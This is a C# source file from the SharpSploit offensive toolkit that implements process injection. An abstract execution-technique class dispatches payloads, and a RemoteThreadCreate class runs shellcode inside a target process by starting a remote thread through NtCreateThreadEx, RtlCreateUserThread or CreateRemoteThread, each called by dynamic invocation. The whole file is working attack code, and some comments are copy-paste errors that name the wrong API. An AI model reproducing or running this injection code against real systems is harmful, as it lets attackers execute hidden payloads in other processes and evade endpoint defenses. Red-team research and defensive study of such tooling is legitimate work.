using System;
using System.Linq;

namespace SharpSploit.Execution.Injection
{
    /// <summary>
    /// Base class for Injection strategies.
    /// </summary>
    public abstract class ExecutionTechnique
    {

        //An array containing a set of PayloadType objects that are supported.
        protected Type[] supportedPayloads;

        /// <summary>
        /// Informs objects using this technique whether or not it supports the type of a particular payload.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">A payload.</param>
        /// <returns>Whether or not the payload is of a supported type for this strategy.</returns>
        public abstract bool IsSupportedPayloadType(PayloadType payload);

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        abstract internal void DefineSupportedPayloadTypes();

        /// <summary>
        /// Inject and execute a payload in the target process using a specific allocation technique.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The type of payload to execute.</param>
        /// <param name="alloc">The allocation tpe to use.</param>
        /// <param name="process">The target process.</param>
        /// <returns></returns>
        public bool Inject(PayloadType payload, AllocationTechnique alloc, System.Diagnostics.Process process)
        {
            Type[] funcPrototype = new Type[] { payload.GetType(), alloc.GetType(), process.GetType()};

            try
            {
                //Get delegate to the overload of Inject that supports the type of payload passed in
                System.Reflection.MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);

                //Dynamically invoke the appropriate Allocate overload
                return (bool)inject.Invoke(this, new object[] { payload, alloc, process });
            }
            //If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(payload.GetType());
            }
        }

        /// <summary>
        /// Execute a payload in the target process at a specified address.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The type of payload to execute.</param>
        /// <param name="baseAddr">The base address of the payload.</param>
        /// <param name="process">The target process.</param>
        /// <returns></returns>
        public bool Inject(PayloadType payload, IntPtr baseAddr, System.Diagnostics.Process process)
        {
            Type[] funcPrototype = new Type[] { payload.GetType(), baseAddr.GetType(), process.GetType() };

            try
            {
                //Get delegate to the overload of Inject that supports the type of payload passed in
                System.Reflection.MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);

                //Dynamically invoke the appropriate Allocate overload
                return (bool)inject.Invoke(this, new object[] { payload, baseAddr, process });
            }
            //If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(payload.GetType());
            }
        }

        /// <summary>
        /// Execute a payload in the current process using a specific allocation technique.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The type of payload to execute.</param>
        /// <param name="alloc">The allocation technique to use.</param>
        /// <returns></returns>
        public bool Inject(PayloadType payload, AllocationTechnique alloc)
        {
            Type[] funcPrototype = new Type[] { payload.GetType(), alloc.GetType()};

            try
            {
                //Get delegate to the overload of Inject that supports the type of payload passed in
                System.Reflection.MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);

                //Dynamically invoke the appropriate Allocate overload
                return (bool)inject.Invoke(this, new object[] { payload, alloc });
            }
            //If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(payload.GetType());
            }
        }
    }

    
    /// <summary>
    /// RemoteThread variant that simply creates a thread in a remote process at a specified address using NtCreateThreadEx.
    /// </summary>
    public class RemoteThreadCreate : ExecutionTechnique
    {
        //Publically accessible options
        public bool suspended;
        public APIS api;

        public enum APIS : int
        {
            NtCreateThreadEx = 0,
            //NtCreateThread = 1,
            RtlCreateUserThread = 2,
            CreateRemoteThread = 3
        };

        //Handle of the new thread. Only valid after the thread has been created.
        public IntPtr handle = IntPtr.Zero;

        /// <summary>
        /// Default constructor.
        /// </summary>
        public RemoteThreadCreate()
        {
            DefineSupportedPayloadTypes();

        }

        /// <summary>
        /// States whether the payload is supported.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">Payload that will be allocated.</param>
        /// <returns></returns>
        public override bool IsSupportedPayloadType(PayloadType payload)
        {
            return supportedPayloads.Contains(payload.GetType());
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// Update when new types of payloads are added.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        internal override void DefineSupportedPayloadTypes()
        {
            //Defines the set of supported payload types.
            supportedPayloads = new Type[] {
                typeof(PICPayload)
            };
        }

        /// <summary>
        /// Only ever called if the user passed in a Payload type without an Inject overload.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <returns></returns>
        public bool Inject(PayloadType payload, AllocationTechnique alloc, System.Diagnostics.Process process)
        {
            throw new PayloadTypeNotSupported(payload.GetType());
        }

        public bool Inject(PICPayload payload, AllocationTechnique allocationTechnique, System.Diagnostics.Process process)
        {

            IntPtr baseAddr = allocationTechnique.Allocate(payload, process);

            return Inject(payload, baseAddr, process);
        }


        /// <summary>
        /// Create a thread in the remote process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="payload">The shellcode payload to execute in the target process.</param>
        /// <param name="baseAddr">The address of the shellcode in the target process.</param>
        /// <param name="process">The target process to inject into.</param>
        /// <returns></returns>
        public bool Inject(PICPayload payload, IntPtr baseAddr, System.Diagnostics.Process process)
        {

            //TODO: Account for API option

            IntPtr threadHandle = new IntPtr();

            Native.NTSTATUS result = Native.NTSTATUS.Unsuccessful;

            if (api == RemoteThreadCreate.APIS.NtCreateThreadEx)

                //Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
                result = DynamicInvoke.Native.NtCreateThreadEx(ref threadHandle, Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero,
                    process.Handle, baseAddr, IntPtr.Zero, suspended, 0, 0, 0, IntPtr.Zero);

            else if (api == RemoteThreadCreate.APIS.RtlCreateUserThread)

                //Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
                result = DynamicInvoke.Native.RtlCreateUserThread(process.Handle, IntPtr.Zero, suspended,IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, baseAddr, IntPtr.Zero, ref threadHandle, IntPtr.Zero);

            else if (api == RemoteThreadCreate.APIS.CreateRemoteThread)
            {
                uint flags = 0;

                if (suspended == true)
                    flags = 0x00000004;

                IntPtr threadid = new IntPtr();

                //Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
                threadHandle = DynamicInvoke.Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, flags, ref threadid);

                if (threadHandle != IntPtr.Zero)
                {
                    handle = threadHandle;
                    return true;
                }
                else
                    return false;
            }

                

            //If successful, return the handle to the new thread. Otherwise return NULL
            if (result == Native.NTSTATUS.Unsuccessful)
                return false;

            else if (result > Native.NTSTATUS.Success)
            {
                handle = threadHandle;
                return true;
            }
            else
                return false;
            
        }
    }
}
